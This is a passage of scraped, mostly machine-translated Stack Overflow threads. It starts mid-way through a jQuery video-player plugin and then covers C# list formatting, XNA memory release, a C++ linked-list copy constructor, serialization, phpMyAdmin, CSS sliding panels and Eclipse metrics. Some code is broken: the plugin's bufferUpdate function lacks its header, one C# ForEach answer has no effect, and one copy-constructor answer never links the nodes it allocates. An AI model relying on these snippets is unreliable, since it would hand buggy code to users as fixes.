        $hdVideo.wrap($video_wrap);
        $hdVideo.after($video_controls);
        var full_screen = 0;
        //get new elements
        var $video_container = $hdVideo.parent('.hd-video-player');
        var $video_main_control = $('.hd-video-main-control', $video_container);
        $video_controls = $('.hd-video-controls', $video_container);
        var $hd_play_btn = $('.hd-video-play', $video_container);
        var $hd_video_seek = $('.hd-video-seek', $video_container);
        var $hd_video_buffer = $('.hd-video-buffer', $video_container);
        var $hd_video_timer_curr = $('.hd-video-timer-curr', $video_container);
        var $hd_video_timer_tot_time = $('.hd-video-timer-tot-time', $video_container);
        var $hd_volume = $('.hd-volume-slider', $video_container);
        var $hd_volume_value = $('.hd-volume-value-slider', $video_container);
        var $hd_volume_btn = $('.hd-volume-button', $video_container);
        var $hd_hd_swipe_btn = $('.hd-hd-swipe-button', $video_container);
        var $hd_full_screen_btn = $('.hd-full-screen-button', $video_container);
        var $player_change_btn = $('.hd-flv-html5-switch', $video_container);
        $video_controls.hide(); // keep the controls hidden
        var firstTime=1;

        /* Video Elements Fetching */
        var videoAttr = {};
        videoAttr.poster = $("video").attr("poster");
        videoAttr.src = $("source").map(function() {
            return $(this).attr("src");
        });
        videoAttr.quality = $("source").map(function() {
            return $(this).attr("data-quality");
        });
        videoAttr.type = $("source").map(function() {
            return $(this).attr("type");
        });
        videoAttr.codecs = $("source").map(function() {
            return $(this).attr("codecs");
        });

        /* Video Elements Fetching Ends */

        /* Poster image into screen image */

        var $video_bind_pst = $('<img class="hd-vid-poster-img" src="'+videoAttr.poster+'" data-width="544" data-height="306"><div class="hd-video-main-control"></div>');
        //$hdVideo.before($video_bind_pst);

        //var
        //width: 630px !important; height: 354px !important; top: 0px !important; left: 0px !important; max-width: 630px !important;

        /* Poster image into screen image ends*/

        /* Play/Pause */
        var gPlay = function() {

            txt =  navigator.platform ;
            if(txt =='iPhone'|| txt =='Linux armv7l')
            {
                window.location.href = videoAttr.src[0];
            }
            else{
                if($hdVideo.attr('paused') == false) {
                    $hdVideo[0].pause();
                    $video_main_control.removeClass("hd-video-main-control-none");
                }
                else {
                    if(firstTime)
                    {
                        $hdVideo.attr('src', vidStatistics.default_vid_src);
                        firstTime=0;
                    }
                    $hdVideo[0].play();
                    $hdVideo.attr('preload', 'auto');
                    $video_main_control.addClass("hd-video-main-control-none");
                    $hdVideo.addClass("video1-visible");
                }
            }
            return false;
        };

        var hd_autoply =$("video").attr("play_auto");
        if(hd_autoply=="autoplay"){
            $hdVideo[0].play();
            $video_main_control.addClass("hd-video-main-control-none");
            $hd_play_btn.addClass('hd-paused-button');
        }

        $video_main_control.click(gPlay);
        $hd_play_btn.click(gPlay);
        $hdVideo.click(gPlay);
        $hdVideo.bind('play', function() {
            $hd_play_btn.addClass('hd-paused-button');
            return false;
        });
        $hdVideo.bind('pause', function() {
            $hd_play_btn.removeClass('hd-paused-button');
            return false;
        });
        $hdVideo.bind('ended', function() {
            $hd_play_btn.removeClass('hd-paused-button');
            $(".hd-video-main-control").removeClass('hd-video-main-control-none');
            return false;
        });

        var gTimeFormat=function(seconds){
            var m=Math.floor(seconds/60)<10?"0"+Math.floor(seconds/60):Math.floor(seconds/60);
            var s=Math.floor(seconds-(m*60))<10?"0"+Math.floor(seconds-(m*60)):Math.floor(seconds-(m*60));
            return m+":"+s;
        };
        /* Play/Pause */

        /* Progressbar Slider */
        var seeksliding;
        var createSeek = function() {
            if($hdVideo.attr('readyState'))
            {
                $hd_video_timer_tot_time.text(gTimeFormat($hdVideo.attr('duration')));
                var video_duration = $hdVideo.attr('duration');
                $hd_video_seek.slider({
                    value: 0,
                    step: 0.01,
                    orientation: "horizontal",
                    range: "min",
                    max: video_duration,
                    animate: true,
                    slide: function(){
                        seeksliding = true;
                    },
                    stop:function(e,ui){
                        seeksliding = false;
                        $hdVideo.attr("currentTime",ui.value);
                    }
                });
                $video_controls.show();
            }
            else {
                setTimeout(createSeek, 150);
            }
            return false;
        };
        createSeek();

        var seekUpdate = function() {
            var currenttime = $hdVideo.attr('currentTime');
            if(!seeksliding)
            {
                $hd_video_seek.slider('value', currenttime);
                $hd_video_timer_curr.text(gTimeFormat(currenttime));
            }
            return false;
        };
        $hdVideo.bind('timeupdate', seekUpdate);
        /* Progressbar Slider */

        /* Buffer Slider */
        var buffersliding;
        var createBuffer = function() {
            if($hdVideo.attr('readyState'))
            {
                $hd_video_timer_tot_time.text(gTimeFormat($hdVideo.attr('duration')));
                var video_duration = $hdVideo.attr('duration');
                $hd_video_buffer.slider({
                    value: 0,
                    step: 0.01,
                    orientation: "horizontal",
                    range: "min",
                    max: video_duration,
                    animate: true,
                    disabled: true,
                    slide: function(){
                        buffersliding = true;
                    },
                    stop:function(e,ui){
                        buffersliding = false;
                        $hdVideo.attr("buffered",ui.value).end(0);
                    }
                });
                $video_controls.show();
            }
            else {
                setTimeout(createBuffer, 150);
            }
            return false;
        };
        createBuffer();

//              var buffertime = $hdVideo.get(0).buffered.end(0);
            var buffertime = $hdVideo[0].buffered.end(0);
            var currenttime = $hdVideo.attr('currentTime');
            if(!buffersliding)
            {
                if(currenttime>buffertime){
                    $hd_video_buffer.slider('value', currenttime);
                }
                else{
                    $hd_video_buffer.slider('value', buffertime);
                }
            }
            return false;
        };
        $hdVideo.bind('timeupdate', bufferUpdate);
        /* Buffer Slider end*/

        /* Volume Control */
        var video_volume = 1;
        $hd_volume.slider({
            value: 0.4,
            orientation: "horizontal",
            range: "min",
            max: 1,
            step: 0.05,
            animate: true,
            slide:function(e,ui){
                $hdVideo.attr('muted',false);
                video_volume = ui.value;
                $hdVideo.attr('volume',ui.value);
                $hd_volume_btn.removeClass('hd-volume-mute');

                if(ui.value*100 == 0) {
                    $hd_volume_btn.css('background-position', '-244px -126px');
                }
                else if(ui.value*100 <= 15) {
                    $hd_volume_btn.css('background-position', '-244px -96px');
                }
                else if (ui.value*100 <= 45) {
                    $hd_volume_btn.css('background-position', '-244px -66px');
                }
                else if (ui.value*100 <= 85) {
                    $hd_volume_btn.css('background-position', '-244px -36px');
                }
                else {
                    $hd_volume_btn.css('background-position', '-244px -6px');
                }
            }
        });

        var muteVolume = function() {
            if($hdVideo.attr('muted')==true) {
                $hdVideo.attr('muted', false);
                $hd_volume.slider('value', video_volume);
                $hd_volume_btn.removeClass('hd-volume-mute');
            }else{
                $hdVideo.attr('muted', true);
                $hd_volume.slider('value', '0');
                $hd_volume_btn.addClass('hd-volume-mute');
            }
            return false;
        };
        /* Volume Control */
        /* Full Screen */
        var fullScreen = function(){
            if(full_screen == 0){
                full_screen = 1;
                $(".hd-video-player").addClass("fullscreen-video-container");
                $(".hd-video-player video.hd-flv-player").addClass("fullscreen-video");
                $(".hd-video-main-control").addClass("fullscreen-hd-video-main-control");
                $(".hd-video-controls").addClass("fullscreen-control-elements");
            }
            else
            {
                full_screen = 0;
                $(".hd-video-player").removeClass("fullscreen-video-container");
                $(".hd-video-player video.hd-flv-player").removeClass("fullscreen-video");
                $(".hd-video-main-control").removeClass("fullscreen-hd-video-main-control");
                $(".hd-video-controls").removeClass("fullscreen-control-elements");
            }
            return false;
        };
        $('body').keydown(function(e){
            if (e.keyCode == 27 && full_screen == 1) {
                fullScreen();
            }
            console.log(e);
            return false;
        });
        /* Full Screen Ends*/

        /* Default Video Quality */
        var defaultVideoQuality = function(videoAttr){
            var vidStatistics = {};
            vidStatistics.support_vid_count=0;
            var i, isSupp, myVid=document.createElement('video');
            for(i=videoAttr.quality.length-1; i>=0; i--)
            {
                path = videoAttr.src[i];
                var path = videoAttr.src[i],
                ext = path.substr(path.lastIndexOf('.') + 1);
                isSupp = myVid.canPlayType('video/'+ext+';');
                if(isSupp=="maybe" || isSupp=="probably" )
                {
                    vidStatistics.default_vid_qty = videoAttr.quality[i];
                    vidStatistics.default_vid_src = videoAttr.src[i];
                    vidStatistics.support_vid_count++;
                }
            }
            if(vidStatistics.default_vid_qty == "hd")
                $("a.hd-hd-swipe-button").addClass("hd-hd-swipe-button-hd");
            else
                $("a.hd-hd-swipe-button").removeClass("hd-hd-swipe-button-hd");

            return(vidStatistics);
        };
        /* Default Video Quality Ends*/

        /* HD Available Check */
        var hdAvailableCheck = function(videoAttr){
            var k=0, i, isSupp, sdSupport = 0;
            var  myVid=document.createElement('video');
            for(i=0; i<videoAttr.quality.length; i++)
            {
                path = videoAttr.src[i];
                var path = videoAttr.src[i],
                ext = path.substr(path.lastIndexOf('.') + 1);
                isSupp = myVid.canPlayType('video/'+ext+';');
                if(isSupp=="maybe" || isSupp=="probably" )
                {
                    if(videoAttr.quality[i]=="hd")
                        k=1;
                    else
                        sdSupport=1;
                }
            }
            if (k==0)
                $hd_hd_swipe_btn.css('display', 'none');
            if (sdSupport==0)
                $hd_hd_swipe_btn.css('pointer-events', 'none').css('cursor', 'default');
            return false;
        }
        /* HD Available Check Ends*/

        /* Video Quality Check*/
        var videoQualityCheck = function(){
            var i, $currVid, currQuality;
            $currVid = $hdVideo[0].currentSrc;
            for(i=0; i<videoAttr.quality.length; i++) //Get current video quality
                if($currVid == videoAttr.src[i])
                    currQuality=videoAttr.quality[i];
            if(currQuality == "hd")
                $("a.hd-hd-swipe-button").addClass("hd-hd-swipe-button-hd");
            else
                $("a.hd-hd-swipe-button").removeClass("hd-hd-swipe-button-hd");
            return false;
        }
        /* Video Quality Check Ends*/

        /* Quality Swipe */
        var playerstage = 0;
        var hdswipe = function(){
            var currVid, currExt, currVidName, currQuality, i;
            if($hdVideo.attr('paused')==false)
                playerstage=1;
            currVid = $hdVideo[0].currentSrc;
            var currVidTime = $hdVideo.attr('currentTime');
            currExt = currVid.substr(currVid.lastIndexOf('.') + 1);
            for(i=0; i<videoAttr.quality.length; i++) //Get current video quality
                if(currVid == videoAttr.src[i])
                    currQuality=videoAttr.quality[i];
            for(i=0; i<videoAttr.quality.length; i++) //Swipe the Video
            {
                if((currExt==videoAttr.src[i].substr(videoAttr.src[i].lastIndexOf('.') + 1))&&(currQuality!= videoAttr.quality[i]))
                {  
                    $hdVideo.attr('src', videoAttr.src[i]);
                    resumeCurrTime(currVidTime);
                    gPlay();
                    createSeek();
                    createBuffer();
                    playerstage=0;
                    break;
                }
            }
            alert(currQuality);
            if(currQuality == "sd")
                $("a.hd-hd-swipe-button").addClass("hd-hd-swipe-button-hd");
            else
                $("a.hd-hd-swipe-button").removeClass("hd-hd-swipe-button-hd");
            return false;
        }

        var resumeCurrTime = function(currVidTime) {
            if($hdVideo.attr('readyState'))
            {
                $hdVideo[0].currentTime = currVidTime;
            }
            else                            
                setTimeout(function() { resumeCurrTime(currVidTime); }, 150);
            return false;
        }
        /* Quality Swipe Ends */

        /* HTML5 / FLV Swipe */
        var playerChangeIntFn = function(){
            if(full_screen==1)
                fullScreen();
            $hdVideo.attr('preload', 'none');
            $hdVideo.load();
            var trigger = "flash";
            playerChange(trigger);
            return false;
        };
        /* HTML5 / FLV Swipe Ends */
        var vidStatistics = {};
        vidStatistics = defaultVideoQuality(videoAttr);
        hdAvailableCheck(videoAttr);
        $hd_hd_swipe_btn.click(hdswipe); //HD On/Off
        $hd_volume_btn.click(muteVolume); //Mute Volume
        $hd_full_screen_btn.click(fullScreen); //Full Screen On/Off
        $video_container.dblclick(fullScreen); //Full Screen On/Off
        $player_change_btn.click(playerChangeIntFn); //Full Screen On/Off
    });
};
// plugin defaults
$.fn.hdVideo.defaults = {
};
})(jQuery); 
```

HTML是：

```
<video src="" width="830" height="354" class="hd-flv-player" poster="asserts/poster.png" controls="controls" data-name="demo video" data-uid="57fb2708" preload="none">
        <source src="http://video-js.zencoder.com/oceans-clip.mp4" data-quality="hd"></source>
        <source src="http://static.clipcanvas.com/sample/clipcanvas_14348_offline.mp4" data-quality="sd"></source>
        <source src="http://video.webmfiles.org/big-buck-bunny_trailer.webm" data-quality="hd"></source>
        <source src="asserts/300_VP8.webm" data-quality="sd"></source>
    </video> 
```

文件类型：`<!DOCTYPE html>`

注意：我知道 IE7 不支持 HTML5 视频。但我只想绑定控制代码。这样我就可以使用 Flash Fall back。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:44:50.933

回复您的评论

> 该错误是因为 ie7 支持 JQuery 中的“myVid.canPlayType()”

那么这需要修复，不是吗？即使它看起来像第三方库，您仍然可以修复其中的代码，甚至可以将错误修复提交给开发人员。也许他们甚至有更高版本的库，你可以检查一下。

```
if (myVid.canPlayType) 
```

将检查对象中是否存在函数。如果它不存在，就像你说的那样，它可能不支持 HTML 视频。然后，您应该退出插件并出现错误，或者在插件中有一个选项，哪些内容应该用作后备。

[演示](http://jsfiddle.net/6nHnw/1/)

# c# - 如何格式化列表中的每个字符串？

> ID：13061916
> 
> 赞同：0
> 
> 时间：2012-10-25T05:07:31.713
> 
> 标签：c#

我有这个函数，我需要它将列表中的字符串格式化为以 http:// 开头：

```
 private List<string> offline(string targetDirectory)
        {

            List<string> directories = new List<string>();

            try
            {
                string[] dirs = Directory.GetDirectories(targetDirectory, "*.*", SearchOption.TopDirectoryOnly);
                for (int i = 0; i < dirs.Length; i++)
                {

                    directories.Add(dirs[i]);
                }
            }
            catch
            {

            }        
            return directories;    
        } 
```

该函数返回硬盘中的目录字符串列表。喜欢`c:\`和`c:\windows`

我希望最后的 List 将代替`c:\\`and `c:\\windows`in`index[0]`并将`index[1]`其格式化为: `http://c:\`，`http://c:\windows`因此`http://c:\temp`List 的每个字符串都将以 http:// 开头。

我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T05:10:38.953

> 所以列表中的每个字符串都将以 http:// 开头。

```
List<string> newList =  directories.Select(r=> "http://" + r).ToList(); 
```

或者

```
var list2 = directories.Select(r => string.Concat("http://", r)).ToList(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:12:15.960

添加到列表时为什么不附加

```
directories.Add("http://" + dirs[i]); 
```

或者

```
return directories.Select(rs=> "http://" + rs).ToList() 
```

或者

```
directories.ForEach(rs=>rs= "http://" + rs);
return directories; 
```

# c# - XNA 4.0 GameStateManagement 屏幕未释放内存

> ID：13061923
> 
> 赞同：0
> 
> 时间：2012-10-25T05:08:05.503
> 
> 标签：c#, memory-management, dispose, xna-4.0

我正在使用 GameStateManagement，但我在游戏中遇到了内存问题。我将游戏的每个部分作为不同的屏幕。我有一个用于徽标的屏幕，一个用于主标题的屏幕，等等。我想我一直在错误地管理屏幕，但我一直无法找到有关我的问题的信息。

当此徽标屏幕移动到标题菜单屏幕时，它似乎并没有释放此徽标屏幕的内存资源，而且我的所有屏幕似乎都遇到了这个问题，并且内存开始堆积很多。我在做 UnloadContent 对吗？我是否需要在 UnloadContent 下对我的纹理等调用 Dispose()？我是否正确移除了屏幕？关于我做错了什么有什么想法吗？

这是我的徽标屏幕：

```
namespace Tower_Defense
{
    class Logo : GameScreen
    {
        Tower_Defense curGame;
        GraphicsDeviceManager graphics;
        AudioManager audioManager;
        Texture2D logoTexture;
        int gamecycles;

        public Logo(Tower_Defense game, GraphicsDeviceManager g, AudioManager am)
        {
            curGame = game;
            audioManager = am;
            graphics = g;
            EnabledGestures = GestureType.Tap;
        }

        public override void LoadContent()
        {
            base.LoadContent();

            logoTexture = Load<Texture2D>("Textures/Backgrounds/logo");

            gamecycles = 0;
        }

        public override void UnloadContent()
        {
            base.UnloadContent();
        }

        public override void Draw(GameTime gameTime)
        {
            ScreenManager.SpriteBatch.Begin();

            ScreenManager.SpriteBatch.Draw(logoTexture, Vector2.Zero, Color.White);

            ScreenManager.SpriteBatch.End();
        }

        public override void Update(GameTime gameTime, bool otherScreenHasFocus, bool coveredByOtherScreen)
        {
            gamecycles++;

            if (gamecycles >= 60)
            {
                ScreenManager.AddScreen(new TitleScreen(curGame, graphics, audioManager, false), null);
                this.UnloadContent();
                ScreenManager.RemoveScreen(this);
            }

            base.Update(gameTime, otherScreenHasFocus, coveredByOtherScreen);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T08:41:26.987

`ContentManager`“拥有”它加载的所有资源。您不能自己卸载它们。您只能卸载它们`ContentManager.Unload`- 这会卸载该特定经理已加载的所有内容。（[更多](https://stackoverflow.com/a/9870420/165500) [细节](https://stackoverflow.com/a/12955811/165500)。）

因此，如果要在每个屏幕上加载和卸载资源，则必须`ContentManager`为每个屏幕创建一个实例。

# c++ - 链表类的复制构造函数

> ID：13061933
> 
> 赞同：0
> 
> 时间：2012-10-25T05:09:01.360
> 
> 标签：c++

所以我想复制整个链表类，我很难弄清楚如何去做，

```
class list{
   public:
  list(const list &t);
private:
  struct Node{
    int x;
    Node *next;
  }*p; 
```

我从这样的事情开始：

```
list::list(const list &t){
  Node* q;
  q=new Node;
  while (p!=NULL){
    q->x= p->x;}
} 
```

但我不确定我是否在正确的轨道上或什么。我也有麻烦我应该如何测试这样的复制构造函数？例如，我有列表 l1，然后我将几个整数插入到一个列表中，然后我如何复制它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:19:14.250

在您的示例中，如果您初始化 p 它将永远不会工作，或者如果`p != NULL`. 您必须在遍历时分配新节点`t list`：

```
 p = NULL;
  Node* copy = l.p;
  Node* insert = p;
  Node* inserted_el = NULL;
  while (copy){
     insert = new Node(); 
     insert->x = copy->x; 
     insert->next = NULL;
     if (inserted_el) {
         inserted_el->next = insert; //copy memory pointer to next element
     } else {
         p = insert; //copy memory pointer to list head
     }
     copy = copy->next;
     inserted_el = insert;
  } 
```

这是基本思想。也不要忘记实现分配运算符和析构函数。用法：

```
list t1;
//insert nodes
list t2(t1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T06:08:56.393

您的代码中最大的问题是您没有在需要时复制列表的每个节点。

这是ctor的代码：

```
list::list(const list &t)
{
  p = NULL;            // Init the head of the list this is vital important.

  // Loop over the elements of the passed list if any.
  Node *pt = t.p;
  Node *last_local_element = NULL;
  while (pt != NULL)
  {
     // Allocate a new node and set the fields there.
     Node *q = new Node;
     q->x= pt->x;
     q->next = NULL;

     // Add new node to the local list.
     if (last_local_element != NULL) {
         last_local_element->next = q;
     } else {
         p = q;
     }

     last_local_element = q;

     // Shift the loop variable along the passed list.
     pt = pt->next;
  }
} 
```

调用复制ctor的最常见情况有两种：

```
list my_list1;

list my_list2(my_listl);           // Explicit call.
list my_list3 = my_listl;          // Assignment in the definition statement. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T06:24:26.023

在设计类时，您需要小心内存管理。这是代码：

```
list::list(const list& t) {
  Node* n = t.p;
  Node* m = p;
  while (n) {
    if (!m) {
      m = new Node(); // Allocate memory.
      if (!p) p = m;
    }
    m->x = n->x;
    m = m->next;
    n = n->next;
  }

  if (m) { // Original list is longer, delete the rest of the list.
    Node * tmp = m;
    m = m->next;
    delete tmp;
  }
} 
```

# c# - C#（或 VB）：如何修改可序列化的类

> ID：13061934
> 
> 赞同：1
> 
> 时间：2012-10-25T05:09:01.913
> 
> 标签：c#, serialization

我有一个有很多成员的班级。有些成员是不需要的。我想从类定义中删除不需要的成员。

该类被声明为可序列化。我担心以前持久化的对象不会正确反序列化。更新可序列化类的定义的过程是什么？[序列化（C# 和 Visual Basic）](http://msdn.microsoft.com/en-us/library/vstudio/ms233843.aspx)不讨论该主题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:13:53.447

您不必从您的班级中删除成员。相反，您可以通过使用非序列化属性装饰来选择退出成员。使用[非序列化](http://msdn.microsoft.com/en-us/library/system.nonserializedattribute.aspx)属性装饰的成员将不会被序列化。

```
[Serializable()]        
public class SimpleObject  {

    //A field that is serialized.
    public int member1;

    // A field that is not serialized.
    [NonSerialized()] public string member5; 

    public SimpleObject() {

        member1 = 11;
        member5 = "hello world!";
    }

} 
```

对先前持久化对象的反序列化将在 NonSerialized 成员字段上保存一个空值。[为了解决这个问题，您可以在使用OnDeserialized](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.ondeserializedattribute.aspx)属性修饰的自定义方法上编写成员初始化代码。

# php - my phpmyadmin showing blank screen

> ID：13061937
> 
> 赞同：0
> 
> 时间：2012-10-25T05:09:16.740
> 
> 标签：php, phpmyadmin, wampserver

My `localhost/phpmyadmin` displaying the blank screen.
My php Version is 5.3.0\. I am using `Wamp` server.
Yesterday it was opened properly but today it's displaying the blank screen.
So whether is the problem in my code or in `wamp` server?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:28:12.867

If you are using Skype then close/quit the Skype program and try restart the WAMP services again.

**UPDATE:**

Skype listens on port 80\. It could be the reason for displaying a blank screen.

You can disable this option in Skype. Go to Skype menu, Tools -> Options -> Advanced -> Connection -> Uncheck "Use port 80..."

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:33:51.120

可能是端口被其他一些服务占用的机会，我不确定，但尝试 start->run-> services.msc 如果打开则停止 IIS 服务..

或者

如果您有Skype，则意味着更改Skype的端口，因为Skype和wamp是某个端口80..

谢谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:18:51.653

我看到的可能原因是：

1.  您的 XAMPP / WAMP 的`MYSQL`服务可能没有启动，请重新检查
2.  您的`phpmyadmin`目录可能丢失，重新安装服务 XAMPP/WAMP

[http://forum.wampserver.com/read.php?2,70332](http://forum.wampserver.com/read.php?2,70332)

[http://www.linuxquestions.org/questions/linux-server-73/http-localhost-phpmyadmin-shows-blank-page-937397/](http://www.linuxquestions.org/questions/linux-server-73/http-localhost-phpmyadmin-shows-blank-page-937397/)

[http://www.oscmax.com/forums/oscmax-v2-installation-issues/22838-fresh-install-blank-localhost-phpmyadmin.html](http://www.oscmax.com/forums/oscmax-v2-installation-issues/22838-fresh-install-blank-localhost-phpmyadmin.html)

这些可能会帮助你

# jquery - 将另一个滑入时将 div 推出

> ID：13061939
> 
> 赞同：4
> 
> 时间：2012-10-25T05:09:27.800
> 
> 标签：jquery, html, css, slider

现在我有一个基本模板，允许我将 4 个不同的 div 切换到一个框架中

[这里](http://www.uvm.edu/~areid/homesite/demo2.html)是网站 - 尝试点击眼睛、鼻子或额头

正如你可以看到一个 div 滑入框架但是，

现在我想添加功能以在其中一个 div 滑入时将中心 div 滑出（因此，如果屏幕上的 div 中的顶部 div 滑动将向下滑动，并且屏幕上的左侧 div 滑动将向右滑动，等等)

有什么办法可以做到这一点？我认为它会与过渡的背景产生很大的影响

谢谢大家

凯蒂

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T22:08:26.003

您需要做的是将您的内容 div 绝对定位在固定的中心 div 内。这将允许您相对于页面中心移动内容 div。我正在使用 css-transitions 来应用幻灯片效果。所以滑动只能在现代浏览器中工作，但它会很好地降级到过时的 IE 浏览器。

**这是一个工作演示的小提琴：http: [//jsfiddle.net/WVPDH/263/](http://jsfiddle.net/WVPDH/263/)**

您显然需要修改此代码以使用您的页面，但这样做应该不会太难。

我已经发布了下面的代码，以防小提琴链接变坏：

## HTML：

```
<div id="fullContainer">
    <div id="right">

    </div>
    <div id="left">

    </div>
    <div id="top">

    </div>
    <div id="bottom">

    </div>
</div>
<div id="centerContainer">
    <div id="relativeContainer">
        <div id="content">
            This is where your face should go.  Notice that I placed it within a centering div.  
            This will enable the face to be absolutely positioned, and allow for you to modify 
            it's position when the side-bars slide in.
            <div data-move="left">Open Left</div>
            <div data-move="right">Open Right</div>
            <div data-move="top">Open Top</div>
            <div data-move="bottom">Open Bottom</div>
        </div>
    </div>
</div> 
```

CSS：

```
#centerContainer {
    position:fixed;
    top:50%;
    left:50%;
    width:0;
    height:0;
}
#relativeContainer {
    position:relative;
}
#fullContainer {
    position:fixed;
    width:100%;
    height:100%;
    top:0;
    left:0;
}
#content {
    position:absolute;
    width:300px;
    height:400px;
    top:-200px;
    left:-150px;
    background:#BADA55;
    border:1px solid #444;
    padding:10px;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;
}
#content.right {
    left:-250px;
}
#content.left {
    left:-50px;
}
#content.bottom {
    top:-300px;
}
#content.top {
    top:-100px;
}

#content div {
    cursor:pointer;
    color:blue;
    text-decoration:underline;
    margin-top:15px;
    text-align:center;
}
#left {
    position:absolute;
    top:0;
    left:-125px;
    height:100%;
    width:100px;
    background:blue;
    border:1px solid #444;
    padding:10px;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;
}

#left.opened {
    left:0;
}

#right {
    position:absolute;
    top:0;
    right:-125px;
    height:100%;
    width:100px;
    background:green;
    border:1px solid #444;
    padding:10px;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;
}

#right.opened {
    right:0;
}

#top {
    position:absolute;
    left:0;
    top:-125px;
    width:100%;
    height:100px;
    background:yellow;
    border:1px solid #444;
    padding:10px;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;
}

#top.opened {
    top:0;
}

#bottom {
    position:absolute;
    left:0;
    bottom:-125px;
    width:100%;
    height:100px;
    background:red;
    border:1px solid #444;
    padding:10px;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    transition: all 0.5s ease;
}

#bottom.opened {
    bottom:0;
} 
```

## JS：

```
function SlideOut(element){

    $(".opened").removeClass("opened");
    $("#"+element).addClass("opened");
    $("#content").removeClass().addClass(element);

}
$("#content div").click(function(){

    var move = $(this).data('move');

    SlideOut(move);

});
​ 
```

# c# - .dbml .cs File throws Object reference not set to an instance of an object

> ID：13061943
> 
> 赞同：1
> 
> 时间：2012-10-25T05:09:44.023
> 
> 标签：c#, asp.net, linq, listview

I have a listview bound to a LinqDataSource

I have steped thorugh the code and it gets to this section of the .dbml file of the xx.designer.cs

```
public System.Data.Linq.Table<qtxt_Competition> qtxt_Competitions     
{
 get{     
     return this.GetTable<qtxt_Competition>();    
 }     
} 
```

and once it passes the return it throws this error

> at System.Web.UI.WebControls.QueryableDataSourceView.OriginalValueMatches(Object originalValue, Object value) at System.Web.UI.WebControls.QueryableDataSourceView.GetOriginalValues(IDictionary keys) at System.Web.UI.WebControls.QueryableDataSourceView.BuildUpdateObjects(IDictionary keys, IDictionary values, IDictionary oldValues, IDictionary`2 validationErrors) at System.Web.UI.WebControls.QueryableDataSourceView.ExecuteUpdate(IDictionary keys, IDictionary values, IDictionary oldValues) at System.Web.UI.WebControls.ContextDataSourceView.ExecuteUpdate(IDictionary keys, IDictionary values, IDictionary oldValues) at System.Web.UI.WebControls.LinqDataSourceView.ExecuteUpdate(IDictionary keys, IDictionary values, IDictionary oldValues) at System.Web.UI.DataSourceView.Update(IDictionary keys, IDictionary values, IDictionary oldValues, DataSourceViewOperationCallback callback) at System.Web.UI.WebControls.ListView.HandleUpdate(ListViewItem item, Int32 itemIndex, Boolean causesValidation) at System.Web.UI.WebControls.ListView.HandleEvent(EventArgs e, Boolean causesValidation, String validationGroup) at System.Web.UI.WebControls.ListView.OnBubbleEvent(Object source, EventArgs e) at System.Web.UI.Control.RaiseBubbleEvent(Object source, EventArgs args) at System.Web.UI.WebControls.ListViewDataItem.OnBubbleEvent(Object source, EventArgs e) at System.Web.UI.Control.RaiseBubbleEvent(Object source, EventArgs args) at System.Web.UI.WebControls.LinkButton.OnCommand(CommandEventArgs e) at System.Web.UI.WebControls.LinkButton.RaisePostBackEvent(String eventArgument) at System.Web.UI.WebControls.LinkButton.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) at System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) at System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData)
> at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)

Ok the strange thing is that for some records it will update fine but for other it keeps throwing this error

Any ideas?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:23:02.353

我找到了这个歧义错误的原因:)

如果您在列表视图中有一个 Datakey，它在数据库中包含空值，这就是结果错误。

# java - eclipse - 限制方法行号

> ID：13061946
> 
> 赞同：3
> 
> 时间：2012-10-25T05:10:01.423
> 
> 标签：java, eclipse, methods

当我的方法中的行数超过一定数量时，如何告诉 eclipse 通知我？

我已经尝试过研究，但最终一无所获。任何帮助将不胜感激。谢谢各位！

也许是一个 Eclipse 插件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:52:15.020

我找到了：

一个 Eclipse 插件 - [http://metrics.sourceforge.net/](http://metrics.sourceforge.net/)

它将在不同的面板中显示指标，但不会在您的日食中发出警告。您需要查看指标。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T05:52:47.100

您可以使用 Eclipse 的代码指标插件来分析您的代码并计算统计数据。一个例子： http: [//metrics.sourceforge.net/](http://metrics.sourceforge.net/)

统计数据包括方法的平均和最大行数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T09:45:10.470

安装[CodePro Analytix](https://developers.google.com/java-dev-tools/codepro/doc/)。[将 CodePro Analytix 中方法长度](https://developers.google.com/java-dev-tools/codepro/doc/features/audit/audit_rules_com.instantiations.assist.eclipse.auditGroup.programComplexity#com.instantiations.assist.eclipse.audit.sourceLength)的问题检测配置为您的行数。将问题级别设置为“错误”。然后使用 CodePro Analytix 的[动态审计模式](https://developers.google.com/java-dev-tools/codepro/doc/features/audit/audit#Dynamic)。它将始终扫描当前*打开的编辑器文件*以查找违规行为。因此，在保存包含 long 方法的文件时，您会立即收到违规错误。

* * *

